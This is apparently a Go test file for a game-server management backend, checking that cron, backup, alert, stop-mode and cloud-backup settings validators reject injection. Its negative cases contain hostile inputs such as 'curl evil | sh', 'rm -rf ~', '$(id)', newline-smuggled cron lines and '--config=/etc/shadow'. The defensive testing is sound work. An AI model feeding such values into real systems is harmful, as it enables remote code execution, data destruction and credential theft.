package backend

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestIsValidCronExpr(t *testing.T) {
	ok := []string{"0 4 * * *", "*/15 * * * *", "0 0 * * 0", "30 2 1-15 * 1,3,5", "@daily"}
	bad := []string{"", "* * * *", "0 4 * * * extra", "0 4 * * *\n* * * * * rm -rf ~", "0 4 * * $(id)", "@reboot", "a b c d e", "0 4 * * * ; id"}
	for _, e := range ok {
		if !IsValidCronExpr(e) {
			t.Errorf("valid cron rejected: %q", e)
		}
	}
	for _, e := range bad {
		if IsValidCronExpr(e) {
			t.Errorf("invalid cron accepted: %q", e)
		}
	}
}

func TestValidateCronSchedule(t *testing.T) {
	if err := ValidateCronSchedule(CronSchedule{MonitorInterval: "5", UpdateInterval: "30", RestartTime: "04:30", CoreUpdateDay: "0"}); err != nil {
		t.Fatal(err)
	}
	bad := []CronSchedule{
		{MonitorInterval: "5 * * * * /bin/sh -c id #"},
		{MonitorInterval: "0"},
		{UpdateInterval: "61"},
		{RestartTime: "25:00"},
		{RestartTime: "4:30\n* * * * * id"},
		{CoreUpdateDay: "8"},
		{CoreUpdateDay: "1;id"},
	}
	for _, s := range bad {
		if ValidateCronSchedule(s) == nil {
			t.Errorf("malicious schedule accepted: %+v", s)
		}
	}
}

func TestCronLineCommandExactScriptMatch(t *testing.T) {
	expr, cmd, ok := cronLineCommand("*/5 * * * * /home/vh/vhserver monitor > /dev/null 2>&1", "/home/vh/vhserver")
	if !ok || cmd != "monitor" || expr != "*/5 * * * *" {
		t.Fatalf("unexpected parse: %q %q %v", expr, cmd, ok)
	}
	if _, _, ok := cronLineCommand("*/5 * * * * /home/vh/vhserver-2 monitor", "/home/vh/vhserver"); ok {
		t.Fatal("other instance matched")
	}
	if _, _, ok := cronLineCommand("# */5 * * * * /home/vh/vhserver monitor", "/home/vh/vhserver"); ok {
		t.Fatal("comment matched")
	}
}

func TestValidateBackupSettings(t *testing.T) {
	if err := ValidateBackupSettings(BackupSettings{MaxBackups: "4", MaxBackupDays: "30", StopOnBackup: "on", AutoBackupEnabled: true, AutoBackupCron: "0 5 * * *"}); err != nil {
		t.Fatal(err)
	}
	for _, s := range []BackupSettings{
		{MaxBackups: `4"; rm -rf ~; "`},
		{StopOnBackup: "maybe"},
		{AutoBackupEnabled: true, AutoBackupCron: "0 5 * * *\n* * * * * id"},
	} {
		if ValidateBackupSettings(s) == nil {
			t.Errorf("unsafe backup settings accepted: %+v", s)
		}
	}
}

func TestSetCfgValues(t *testing.T) {
	in := "# comment\nmaxbackups=\"2\"\nother=\"x\""
	out := setCfgValues(in, map[string]string{"maxbackups": "5", "stoponbackup": "on"}, []string{"maxbackups", "stoponbackup"}, false)
	if !strings.Contains(out, `maxbackups="5"`) || !strings.Contains(out, `stoponbackup="on"`) || !strings.Contains(out, `other="x"`) {
		t.Fatalf("unexpected output:\n%s", out)
	}
}

func TestAlertSettingsMaskingAndValidation(t *testing.T) {
	stored := AlertSettings{DiscordWebhook: "https://discord.example/secret", EmailPass: "smtp-pass", EmailDest: "a@b.c"}
	masked := stored.Masked()
	if masked.DiscordWebhook != SecretMask || masked.EmailPass != SecretMask {
		t.Fatal("secrets not masked")
	}
	if masked.EmailDest != "a@b.c" {
		t.Fatal("non-secret value masked")
	}
	if stored.DiscordWebhook != "https://discord.example/secret" {
		t.Fatal("Masked must not modify the original")
	}

	submitted := masked
	submitted.mergeSecrets(stored)
	if submitted.DiscordWebhook != stored.DiscordWebhook || submitted.EmailPass != stored.EmailPass {
		t.Fatal("masked values must keep stored secrets")
	}

	evil := AlertSettings{DiscordWebhook: `x"; curl evil | sh; "`}
	if evil.Validate() == nil {
		t.Fatal("config injection accepted")
	}
}

func TestAlertSettingsRoundTrip(t *testing.T) {
	dir := t.TempDir()
	srv := GameServerInstance{ID: "vhserver", User: "vhserver", Script: "vhserver", Dir: dir}
	im := NewStaticInstanceManager(t.TempDir(), srv)
	cfg := filepath.Join(dir, "lgsm", "config-lgsm", "vhserver", "vhserver.cfg")
	mustWrite(t, cfg, "discordalert=\"on\"\ndiscordwebhook=\"https://hook/secret\"\n")

	got, err := im.GetAlertSettings("vhserver")
	if err != nil {
		t.Fatal(err)
	}
	if !got.DiscordEnabled || got.DiscordWebhook != SecretMask {
		t.Fatalf("unexpected settings: %+v", got)
	}
	got.EmailDest = "admin@example.com"
	if err := im.SaveAlertSettings("vhserver", got); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(cfg)
	if !strings.Contains(string(data), `discordwebhook="https://hook/secret"`) || !strings.Contains(string(data), `emaildest="admin@example.com"`) {
		t.Fatalf("unexpected config:\n%s", data)
	}
	got.EmailDest = "x\"\nrm -rf ~"
	if err := im.SaveAlertSettings("vhserver", got); err == nil {
		t.Fatal("injection was written")
	}
}

func TestStopModeValidation(t *testing.T) {
	for _, m := range []string{"", "default", "1", "13"} {
		if !IsValidStopMode(m) {
			t.Errorf("valid stop mode rejected: %q", m)
		}
	}
	for _, m := range []string{"0", "14", `1"; id; "`, "abc"} {
		if IsValidStopMode(m) {
			t.Errorf("invalid stop mode accepted: %q", m)
		}
	}
}

func TestCloudBackupValidation(t *testing.T) {
	if err := ValidateCloudBackupSettings(CloudBackupSettings{Enabled: true, Remote: "gdrive", Path: "backups/ark"}); err != nil {
		t.Fatal(err)
	}
	for _, s := range []CloudBackupSettings{
		{Remote: "x; id", Path: "a"},
		{Remote: "gdrive", Path: "--config=/etc/shadow"},
		{Remote: "gdrive", Path: "a b'c"},
		{Remote: "gdrive", Path: "../.."},
		{Enabled: true, Remote: "", Path: "x"},
	} {
		if ValidateCloudBackupSettings(s) == nil {
			t.Errorf("unsafe cloud settings accepted: %+v", s)
		}
	}
}
